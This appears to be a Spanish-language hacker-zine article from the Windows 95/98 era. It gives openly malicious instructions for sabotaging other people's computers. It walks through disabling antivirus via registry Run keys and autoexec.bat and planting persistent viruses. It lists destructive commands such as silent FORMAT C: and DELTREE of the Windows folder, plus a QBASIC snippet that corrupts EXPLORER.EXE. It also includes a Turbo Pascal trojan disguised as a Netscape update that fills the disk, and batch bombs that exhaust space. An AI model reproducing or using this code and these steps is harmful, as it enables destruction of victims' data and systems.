El Radiaktivo Newz Team presenta:
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                +--------------------------------------------+
                |            Tácticas Anti-Windows           |
                |                por BadBit                  |
                +--------------------------------------------+

                              badbit@yahoo.com

             "Con Windows, el software tiene más control sobre la
                       computadora que el usuario mismo"

 /----------\
 |Aclaración|
 \----------/

     No tomo responsabilidad por tus acciones. El contenido de este texto es
únicamente EDUCACIONAL. Todos los casos son HIPOTETICOS, ninguno sucedió en
realidad. No acepto reclamaciones de ningún tipo.

 /---------------------------------------------------\
 | ¿Exactamente de que se va a hablar en este texto? |
 \---------------------------------------------------/

     Principalmente son pequeños trucos para molestar a la gente (y dañar
la imagen de Microsoft) que se aprovechan de la ignorancia de las personas
(yo he burlado a "expertos" de computación) y demostrar que tu sabes más que
ellos y nunca te van a superar.

     ¿A qué se debe que la gente no sepa esto? Pues las computadoras, al
volverse más sencillas de usar, han permitido que usuarios más idiotas se
pongan a usarlas, y tomando en cuenta que hacer un sistema que sea amigable
al usuario y con ambiente gráfico intiutivo no es muy fácil, las computadoras
se han vuelto algo tan complejo que no cualquiera domina en serio su uso.
Pero los que si lo hacen se pueden aprovechar de la ignoracia de los demás.

 /--------------------\
 |    Nescesitas:     |
 \--------------------/

     Es necesario tener acceso físico a la computadora y poder insertar
diskettes o CD-ROMs o cualquier otro medio de almacenamiento portátil.
Otra cosa que podrás ocupar es el programa REGEDIT.EXE que está en el
directorio C:\WINDOWS de la de la mayoría de las computadoras (con Windows
por supuesto), pero es mejor llevarlo por si acaso. También un generador de
diccionarios (disponible en www.hack-net.com) y un ocultador de ventanas (te
recomiendo el icon corral (y no, no te voy a decir donde conseguirlo)).


 /----------------------\
 |    Como comenzar     |
 \----------------------/
 
     Primero hay que encontrar una buena computadora, a una que tu sabes que
si se descompone, alguien va a sufrir mucho :) e ir inocentemente con buenas
intenciones (trabajar es una de ellas), meter tu floppy y decidir que sería
mas molesto, ¿un virus?, ¿quedarse sin espacio en disco duro por una razón 
desconocida?, ¿ver que cada ver que comienza Windows se ve "Fuck You" en
grande?. Bueno, abordaremos todas esas opciones y otras más.

    +-------+
    | Virus |
    +-------+

     De esta opción nos podemos aprovechar porque la gente tiene el concepto
de virus todo revuelto. Creen que si tienen un virus es el fin del mundo. No
tienen en cuenta que alguna persona puede poner uno a propósito. Por desgra-
cia, casi todas las personas confían en software anti-virus y no se dan
cuenta de que son un fraude, pero eso no durará mucho, ya que les pondremos
un virus irremovible. Tu puedes crear tus propios virus para ponerlos en la
máquina de tu víctima. Lo que sucede con estos virus es que son irremovibles
(al menos por McAfee VirusScan) y tendrán que soportar la carga de ellos
aunque no saben que son casi inofensivos.

     Para poder meter estos virus en el sistema, primero hay que desactivar
los anti-virus, aunque trato de dar instrucciones muy generales, van enfoca-
das a McAfee VirusScan (¿ya notaron que lo odio?), pero casi lo mismo se
aplica a Norton y a otros.

     Generalmente, los anti-virus tienen un módulo de escaneo en "background"
y escanea archivos automáticamente al crearlos, copiarlos, moverlos, etc.
Y como tu vas a copiar los virus del floppy al disco duro, ese módulo te
estará molestando a cada rato. Así que presiona Ctrl + Alt + Del y en el
menu que te aparece, escoge el antivirus y presiona. "Finalizar Tarea".
Ahora hay que asegurarnos de que el antivirus no aparecerá jamás. Para eso
selecciona Run (Ejecutar) del menú Start (Inicio) y escribe "regedit". Lo
que verás tal vez te confunda si no has utilizado el registro. Pero hay
muchos textos y revistas al respecto (tal vez yo escriba un texto de como
manejarlo).

     Direccionate hacia:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

     Ahí verás varias entradas, la que creas que es de antivirus bórrala.
Si quieres, puedes borrarlas todas, pero te recomiendo que no borres la de
SystemTray, ya que es importante para que Windows funcione.

    ¿Qué fué lo que hiciste? Ese folder (Run) contiente la información sobre
los archivos que se van a ejecutar al iniciar Windows, y obviamente, si los
borras, Windows ya no los corre. Esto es interesante, ya que tu puedes poner
tus propias entradas, cosa que aprovecharemos más adelante.

    Pero eso no es todo lo que tienes que hacer. Casi todos los antivirus
ponen líneas en el autoexec.bat para que la computadora se escanee cada vez
que arranca, simplemente edita autoexec.bat y borra esas líneas. Otra cosa,
VirusScan tiene otro módulo de escaneo llamado ScreenScan, el cual escanea
la computadora cada vez que se activa el salvapantallas. Para desactivarlo
da un click derecho en el escritorio y selecciona Properties (propiedades),
vas a ver una pestaña llamada ScreenScan (Duh), selecciónala y desactivala
lo más que puedas.

    Nada más para asegurarnos de que no volveremos a ver un anit-virus en esa
computadora, ve al directorio a donde el anti-virus está localizado. No sé
donde es, investígale, y a McAfee bórrale el archivo VSHWIN.EXE o algo así,
y ThunderByte bórrale TBCLEAN.EXE, para Norton elimina NAVAPW32.EXE o los
archivos que crees que se pueden borrar sin que quede completamente
inutilizado (hay que dar la impresión de que el anti-virus sigue ahí).

     Ahora que no hay anti-virus a 20 Km a la redonda, sigue la parte de
infectar la computadora. Sólamente un consejo: que infectar la máquina sea
lo último que hagas, es decir, que infectes la computadora cuando ya te vas
a ir, ya que podrías (aunque es una posibilidad muy remota) infectar los
programas de tu floppie, o has lo siguiente (lo cual es lo más conveniente):

     1. Copia los archivos con el (o los) virus al directorio raíz del disco
duro y al directorio C:\WINDOWS\COMMAND (Si en el directorio raíz hay muy
pocos archivos y los del virus se van a notar, no lo hagas, mejor cópialos al
directorio C:\DOS si es que está).

     2. Abre el AUTOEXEC.BAT y añade líneas para activar los virus y es
importante que le añadas @echo off si es que no lo tiene, por ejemplo:

****Autoexec original (mi autoexec)*************
PATH C:\WINDOWS;C:\WINDOWS\COMMAND;C:\DOS\IMMOUSE
SET BLASTER=A220 I7 D1 T3
rem - By Windows Setup - C:\WINDOWS\COMMAND\MSCDEX.EXE /D:BTCCD001 /V 
SET CLASSPATH=%CLASSPATH%;%SystemRoot%\java\lib
SET PGPPATH=C:\DOS\PGP
PATH=%PATH%;"C:\Archivos de programa\Mts"
************************************************

**************Autoexec modificado***************
@ECHO OFF
PATH C:\WINDOWS;C:\WINDOWS\COMMAND;C:\DOS\IMMOUSE
SET BLASTER=A220 I7 D1 T3
rem - By Windows Setup - C:\WINDOWS\COMMAND\MSCDEX.EXE /D:BTCCD001 /V 
SET CLASSPATH=%CLASSPATH%;%SystemRoot%\java\lib
SET PGPPATH=C:\DOS\PGP
PATH=%PATH%;"C:\Archivos de programa\Mts"
: Virus puestos por BadBit Ja! Ja! Ja!
ECCO2
ECCO3
CD WINDOWS
ECCO2
ECCO3
CD\
************************************************

     No se te ocurra poner los virus en el registry (RUN) o en el Startup
porque se va a notar la caja de MS-DOS, y aparte, Windows no deja correrlos,
dice que hay una operación ilegal. El Autoexec es el mejor lugar para poner-
los.

     La línea ": Virus puestos por BadBit Ja! Ja! Ja!" es una "opción
indocumentada". Los dos puntos indican que esa línea es una etiqueta, pero
cuando MS-DOS encuentra un espacio después de los dos puntos, ignora la
línea y no es procesada. Esa línea la puse por vanidad.


     3. No corras los virus por tí mismo, será muy sospechoso, poníendolos
en el autoexec.bat no deja rastros. Aparte ponerlos ahí, hace que aunque
desinfecten la máquina, volverá a infectarse.

     4. Si no puedes meter floppies a esa computadora, pero esa computadora
tiene internet, saca una cuenta de correo gratuita (como hotmail o yahoo) y
manda a la nueva dirección los virus y luego bájalos. Es otra buena idea
hacer un sitio web con todos los archivos que ocupas para destruir cualquier
sistema.

     Ahora te has de sentir orgulloso de que alguien va a sufrir mucho
cuando se entere de que tiene un virus en el sistema. ¡Disfrútalo!


    +------------+
    | Disco duro |
    +------------+

     Otra cosa que se puede hacer, es causar caos en el disco duro, puede
borrarse algún directorio importante, dejar sin espacio al disco, hacerlo
ilegible o simplemente formatearlo.

     La cosa es cómo hacerlo, fácil, se pueden poner comandos en el autoexec,
pero eso sería demasiado obvio. Mejor hay que hacer programas que hagan lo
que queremos y luego se borren. Los lenguajes que usaré son: Turbo Pascal (o
Pascal), QuickBASIC y Visual Basic. Como vez no escojo lenguajes de bajo
nivel para que la mayoría de la gente pueda usarlos.

     Primero analizaré la opción de poner los comandos en el autoexec:

     Los directorios vulnerables son los siguientes:

C:\WINDOWS
C:\WINDOWS\SYSTEM
C:\Program Files
C:\Archivos de programa
C:\

    Si borras alguno es estos directorios, el sistema se verá en problemas.
Pero si borras los siguientes archivos será menos notorio y tendrás casi
los mismos resultados (o mejores):

C:\WINDOWS\SYSTEM.DAT
C:\WINDOWS\USER.DAT
C:\WINDOWS\WIN.INI     <--(Aunque no lo creas, el borrar estos archivos hace
C:\WINDOWS\SYSTEM.INI  <--que usar windows sea una pesadilla)
C:\WINDOWS\SYSTEM\SHELL32.DLL
C:\COMMAND.COM
C:\WINDOWS\EXPLORER.EXE <--Simplemente cambiar un byte de este archivo y
                           Windows será inusable.
C:\WINDOWS\WIN.COM
C:\IO.SYS
C:\MSDOS.SYS
C:\WINDOWS\FONTS\Fixedsys  <-- Realmente no se el nombre de archivo de estas
C:\WINDOWS\FONTS\Ms Sans Serif <-- fuentes ya que Windows las oculta para que
                                  sea extremadamente difícil borrarlas. Pero
                                  se puede borrar todo el directorio fonts.


    Ahora probemos poner las líneas destructivas en el Autoexec.bat, las
líneas siguientes las podrías usar (las líneas que comienzan con punto y
coma son comentarios):

FORMAT C: /AUTOTEST
;Este comando hace que el disco duro se formatee sin preguntar que si estás
;seguro o si quieres formatear otro o que etiqueta le quieres poner.

CD WINDOWS
DEL *.EXE
;Ya que DOS no pregunta por verificación en estas líneas, son muy útiles.
;En el Autoexec (o en cualquier archivo Batch) no podemos poner DELTREE, ya
;que pide confirmación del usuario para borrar todo.

DEL COMMAND.COM
;En verdad, no he probado si esta línea sirve, tal vez DOS nos lo impide.

CD WINDOWS
DEL WIN.COM

CD WINDOWS
CD SYSTEM
DEL *.DLL

CD WINDOWS
REN EXPLORER.EXE FUCK.YOU

DEL TEMP
REN WINDOWS TEMP
;¿QUEE? ¿El simple hecho de renombrar un directorio inutiliza a windows?

DELTREE WINDOWS /Y
;Ese simple parámetro (/y) hace que no pregunte por confirmación

ATTRIB +H *.*

CD WINDOWS
ECHO y > y.txt
DEL *.* < y.txt
;Esto sirve para que no pregunte por confirmación

    También podemos pensar en programas que nosotros hagamos y alteren
archivos vitales. Por ejemplo este archivo de QBASIC:

      OPEN "C:\WINDOWS\EXPLORER.EXE" FOR APPEND AS #1
      PRINT #1, "BadBit fucked this computer, ENJOY!"
      CLOSE #1
      END

    Esas cuatro líneas bastan para hacer windows inservible. La próxima vez
que arranque Windows, recibirá a usuario con el mensaje: "EXPLORER.EXE está
dañado, debe reinstalar Windows" y de ahí no sacas a esa terca máquina.

    Ahora, en lugar de descomponer el disco (y su contenido), vamos a
llenarlo, ¿como?, haciendo un archivo que llene todo el espacio disponible o
copiando un mismo archivo infinitamente.

    Al final de este archivo uuencodifiqué un creador de diccionarios. Si
lo dejas corriendo en "Background", poco a poco llenará todo el espacio. Pero
¿Cómo hacer que no se note?. Fácil, también uuencodifiqué un programa
llamado The Icon Corral, es una aplicación de windows que hace que las
aplicaciones que tu elijas, se conviertan en un icono en el System Tray, así
puedes dejar corriendo el programa sin que nadie se de cuenta. Un usuario
avanzado podría hacer click en el icono del System Tray, por eso tienes que
poner escoger un ícono no evidente. (Si no entiendes lo que te estoy
diciendo, descodifica los archivos, ejecútalos y entenderás)

********
Nota: El Sytem Tray es el lado derecho de la barra de tareas, donde se
      encuentra el reloj y el control de volumen.
********

    Te recomiendo que corras un generador de diccionarios en un directorio
que sea muy oculto, de ese modo se quedarán sin espacio y no sabrán qué fué
lo que causó eso. Te recomiendo uno de los subdirectorios de
C:\WINDOWS\System.

    Otra forma de llenar el disco (esta es mucho más rápida), es con el
siguiente programa de Turbo Pascal:

PROGRAM beep;
USES crt,dos;
CONST
     Hidden  = $02;
VAR
   code:integer;
   print:text;
   Attr:word ;
   F:file;
BEGIN
code :=263;
SetTime(0,1,0,0);
SetDate(1999,2,10);
clrscr;
writeln('      Copyright 1994-1996 Netscape Communications Corporation');
writeln('                       All rights reserved.');
writeln;
writeln('      Netscape Communications, Netscape, Netscape Navigator and');
writeln('     the Netscape Communications logo are trademarks of Netscape');
writeln('                    Communications Corporation.');
readln;
writeln;
writeln(' Thank you for downloading the Netscape Navigator 3 update, NN3.01');
writeln(' We have made everycare that this program is to your satisfaction.');
writeln;
writeln('    NN3.01 is confirming where your copy of Netscape Navigator is');
writeln('    this make take some time.');
ASSIGN (PRINT,'c:\dos.sys');
writeln(Attr);
REWRITE (PRINT);
repeat
write(Print,'*':500,chr(code));
until KeyPressed;
Close(PRINT);
ASSIGN (F,'c:\dos.sys');
SetFAttr(F, Hidden);
writeln;
writeln(' This copy of NN3.01 contains BUGZ, please download another copy.');
readln;
Randomize;
  repeat
    TextAttr := Random(256);
    Write('DO SIN');
  until code = 264;
END.

    Ese programa es un Trojan llamado Hard Disk Kill, y la verdad no entiendo
porqué esas cosas inútiles en el código. ADVERTENCIA: NO lo corras en tu
computadora, este programa REALMENTE se acaba todo el espacio del disco en
pocos segundos. Sobre aviso no hay engaño.

    La opción de hacer que un archivo se copie y crezca (casi) infinitamente
se puede hacer fácilmente con un archivo batch:

: Para que un archivo crezca infinitamente:
echo qwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwerty > file1.sys
echo qwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwerty > file2.sys
echo qwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwerty > file3.sys
echo qwertyqwertyqwertyqwertyqwertyqwertyqwertyqwertyqwerty > file4.sys
echo a > total.dll
copy file1.sys + file2.sys + file3.sys + file4.sys + total.dll total2.dll
del file?.sys
del total.dll
ren total2.dll total.dll
copy total.dll total2.dll
:start
copy total.dll + total2.dll total3.dll
del total2.dll
del total.dll
copy total3.dll total2.dll
copy total3.dll total.dll
goto start


: Para que un archivo se duplique infinitamente:
echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa > system.sys
:start
MD System
copy system.sys \System
CD System
goto start

    El archivo batch pasado va a comerse a la FAT, ya que también crea
subdirectorios infinitos. Estos archivos los puedes compilar con alguno de
los programas que hay en circulación, así será menos evidente.

    También se debe de tener en cuenta que renombrar un directorio puede
causar caos en el disco duro. El simple hecho de renombrar el directorio de
windows es suficiente para que un usuario inexperto crea que su computadora
está desompuesta y formatee su disco duro. (Parece estúpido pero es cierto).

    Con esto supongo que has agarrado unas cuantas ideas. Pasemos a otro
tema.

    +---------------------+
    | Pantallas de inicio |
    +---------------------+

    Windows 95 o superior comienza con un comercial: La pantalla de inicio.
Esta pantalla es completamente inútil y uno querría ponerle algo más
productivo. Sorprendentemente(?), Micro$oft nunca dió un manera de cambiar
ese dibujo. Pero se ha hablado mucho en revistas y en "Guide to (mostly)
harmless hacking" sobre cómo modificar esa pantalla. Esto es muy conveniente
pues la mayoría de la gente no sabe eso, y uno puede modificar esas pantallas
a su gusto.

   Los archivos que debes editar son Logo.sys, Logow.sys, Logos.sys. La
localización de estos archivos varía, así que búscalos. Pueden tener
atributos de sólo lectura, ocultos y/o sistema. Para editarlos sólamente
ábrelos en Paint (estos archivos son archivos BMP con extensión SYS). Pero
ten cuidado de no modificar su tamaño (320 X 400) ni el número de sus colores
(256). Ten cuidado, ya que estos archivos se miran aplastados cuando los
abres en Paint, calcúlale para que se vea bien al inicio y al final.

   Por alguna extraña razón, no pude hallar el archivo logo.sys en Windows 98
Beta 3.

__________________________________________________
  Esto es todo por el momento pero espero seguir escribiendo sobre este tema
(la verdad es que me encanta). Hasta la próxima.
Escrito por BadBit badbit@yahoo.com

                                                      0101001001010100100101
¿Como se sabe si Bill Gates está mintiendo?           10       0       1  01
Se le mueven los labios.                              11     B@dbit       00
                                                      01           1      10
                                                      10 0           .... 10
                                                      :101010 01011010111101
